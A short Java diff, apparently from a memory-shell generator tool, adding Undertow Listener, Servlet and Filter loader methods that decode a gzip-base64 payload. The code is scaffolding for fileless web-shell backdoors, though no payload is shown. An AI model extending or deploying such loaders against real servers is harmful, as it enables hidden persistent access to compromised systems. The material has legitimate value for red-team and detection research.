@@ -178,6 +178,24 @@ public class MSLoaderBuilder {
         return defaultLoader(cls, MSGzipBase64, javaClassHelper);
     }
 
+    @Middleware(Middleware.Undertow)
+    @MemShell(MemShell.Listener)
+    public byte[] undertowListener(Class cls, String MSGzipBase64, JavaClassHelper javaClassHelper) throws Exception {
+        return defaultLoader(cls, MSGzipBase64, javaClassHelper);
+    }
+
+    @Middleware(Middleware.Undertow)
+    @MemShell(MemShell.Servlet)
+    public byte[] undertowServlet(Class cls, String MSGzipBase64, JavaClassHelper javaClassHelper) throws Exception {
+        return defaultLoader(cls, MSGzipBase64, javaClassHelper);
+    }
+
+    @Middleware(Middleware.Undertow)
+    @MemShell(MemShell.Filter)
+    public byte[] undertowFilter(Class cls, String MSGzipBase64, JavaClassHelper javaClassHelper) throws Exception {
+        return defaultLoader(cls, MSGzipBase64, javaClassHelper);
+    }
+
     /**
      * 直接加载
      */
